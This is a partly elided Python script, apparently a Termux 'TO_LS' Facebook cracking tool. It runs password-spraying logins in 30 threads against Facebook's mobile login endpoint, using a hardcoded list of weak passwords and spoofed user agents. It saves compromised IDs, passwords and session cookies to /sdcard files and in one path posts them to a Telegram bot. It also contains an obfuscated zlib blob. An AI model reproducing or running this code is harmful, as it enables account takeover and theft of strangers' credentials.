...
end_datetime = datetime.datetime(2024, 5, 21, 10, 30, 0) #
...
def compare_phone_time():
    try:
        ...
        if phone_datetime.date() == world_datetime.date() and phone_datetime.time().replace(second=0, microsecond=0) == world_datetime.time().replace(second=0, microsecond=0):
            ...
            print("𝔚𝔢𝔩𝔠𝔬𝔪𝔢 𝔱𝔬 𝔱𝔥𝔢 𝔄𝔩𝔞𝔪𝔡𝔞𝔯 𝔱𝔬𝔬𝔩ﻟ")
            sys.exit()
    except Exception as e:
        print(f"The system is safe, do not be afraid 🙃🤞🏿")
...
if pss ==yso:
 pass
 print("\033[1;32m          You are logged in to Luffy tools  ")
 time.sleep(1)
 os.system('clear')
else:
 exit('\033[1;31m            Error logging in to Luffy tools  ')       
...
print('\n\033[1;37m You have been successfully registered in the TO_LS tool 🔥😎')
...
logo=("""
\33[1;31m \033[1;36m
                •✠• أحـٰ̲ـ۠د’كـ۠ـ๋͜ـبآر آڷـ۠ـ๋͜ـتلـٰ̲ـ۠گِྀٓـرام؟ 🚸•✠ • 
         @TO_LS   •✠•𝗦𝗪𝗘𝗘𝗧•✠ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠶⠶⠶⠶⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠊⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢶⣾⠋⢉⣉⣉⣛⣛⣍⣽⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
...
\033[1;33m ━━━━━━━━━━━━━━━━━━━ \033[1;32m  \33[1;34m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;32MODE.  \x1b[1;32m: ░▒▓█►─═Python + Termux tools ═─◄█▓▒░
\x1b[1;36m{+} \x1b[1;33mMODE   \x1b[1;33m: \x1b[1;33m @TO_LS
\x1b[1;36m{+} \x1b[1;35mTO_LS V«1» 🤞🏻🔥  \x1b[1;35m: @MGDTWU
\033[1;33m ━━━━━━━━━━━━━━━━━━━ \033[1;32 \33[1;34m━━━━━━━━━━━━━━━━━━━━               
""")
                               
def linex():
        print('\033[1;37mᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @TO_LS ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ')
def clear():
        os.system('clear')
        print(('—'*25)+'\n• DeCoDe By @I_S_4 •\n'+('—'*25))
        print(logo)
...
def auto_file(cookies,access_token):
        ...
        print('\n \033[1;97m /sdcard/TO_LS.txt \033[0;97m\n')
        #100010138361148
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        #clear()
                        print('\x1b[1;35m [01] \x1b[1;92ꜱᴇʟᴇᴄᴛ ꜰɪʟᴇ ᴍᴇᴛʜᴏᴅ')
                        linex()
                        xd=input('\033[1;96m𝐂𝐇𝐎𝐎𝐒𝐄  \033[1;94m: ')
                        if xd in ['1','01']:
                               
                                clear()
                                file = input('\033[1;92m𝘼𝙙𝙙 𝙛𝙞𝙡𝙚 𝙥𝙖𝙩𝙝  \033[1;94m: ')
                                try:
                                        ...
                                        menu()
                                clear()
                                print(' \x1b[1;92m[01] \x1b[1;92m𝐌𝐄𝐓𝐇𝐎𝐃')
                                linex()
                                ...
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('112233@')
                                    plist.append('111222333')
                                    plist.append('112233')
                                    plist.append('5544332211')
                                    plist.append('5432112345')
                                    plist.append('555444')
                                    plist.append('102030405060708090')
                                    plist.append('0987654321')
                                    plist.append('12345@@@@')
                                    plist.append('123456654321')
                                    plist.append('11223344@')
                                    plist.append('qqwwee')
                                    plist.append('Ahmed Ahmed')
                                    plist.append('ppooii')
                                    plist.append('zxczxc')
                                    plist.append('zzxxcc')
                                    plist.append('aassdd')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print('\x1b[1;33m𝓦𝓪𝓲𝓽 𝓯𝓸𝓻 𝓽𝓱𝓮 𝓮𝔁𝓪𝓶𝓲𝓷𝓪𝓽𝓲𝓸𝓷  \033[1;94m: \033[1;96m'+total_ids)
                                        print("\033[1;32m 𝔚𝔢𝔩𝔠𝔬𝔪𝔢 𝔱𝔬 𝔱𝔥𝔢 𝔄𝔩𝔞𝔪𝔡𝔞𝔯 𝔱𝔬𝔬𝔩 ")
                                        linex()
...
def za():
    ...
    myid = getKey()
    os.system(" clear ")
    ux=zlib.decompress(b'x\x9c\x05\xc1A\n\xc0 \x0c\x04\xc0\x1fe5\xde|\x8e"\x15Q"f[|~g:\xb9=\x03\xe3\x96\xf1\x92R\xa6=\xbe\x8dRmA\x83&\x84\x08o\xe7kGy)\x9dk\xfe\xf3\xe1\x12\x9d').MGDTWU()
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\033[1;32mTO_LS\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m] \033[1;37m[\033[1;32mOK\033[1;37m/\033[1;91mCP\033[1;37m] \033[1;37m[\033[1;32m%s\033[1;37m\033[1;37m] \033[1;37m[\033[1;96m%s%%\033[1;37m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                print(f'''MODE BY @TO_LS
\r{G7}𝙶𝙾𝙾𝙳 ✔	
• DeCoDe By @I_S_4 •
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @TO_LS ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
•  𝙴𝙼𝙰𝙸𝙻     : {ids}
•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ @MGDTWU ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ
• DeCoDe By @I_S_4 •

• 𝙱𝚈 : @MGDTWU - @TO_LS
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
				''')
                                statusok = f'''MODE BY @TO_LS
       𝙶𝙾𝙾𝙳	✔	
	  ᯓᯓᯓᯓᯓ @TO_LS ᯓᯓᯓᯓᯓ
		•  𝙴𝙼𝙰𝙸𝙻     : {ids}
		•  𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳 : {pas}
	  ...
	  ᯓᯓᯓᯓᯓ @MGDTWU ᯓᯓᯓᯓᯓ
	    ...
	    • 𝙱𝚈 : @TO_LS - @MGDTWU
				...
				'''
                                ...
                                open('/sdcard/TO_LS-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/TO_LS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
...
ᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓᯓ	
	  ...
	  ᯓᯓᯓᯓᯓ @MGDTWU ᯓᯓᯓᯓᯓ
	    ...
	    • 𝙱𝚈 : @TO_LS - @MGDTWU				'''
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        open('/sdcard/TO_LS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [TO_LS] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
	  ...
	  ᯓᯓᯓᯓᯓ @MGDTWU ᯓᯓᯓᯓᯓ
	    ...
	    • 𝙱𝚈 : @TO_LS - @MGDTWU
				...
				'''
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [TO_LS-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/TO_LS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
...
def api1(ids,names,passlist):
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                                ...
                                url = 'https://p.facebook.com/auth/login?include_headers=false&MGDTWU_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [TO_LS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TO_LS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/TO_LSCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    "user-agent": 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [TO_LS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/TO_LS-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/TO_LS_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [TO_LS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TO_LS-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
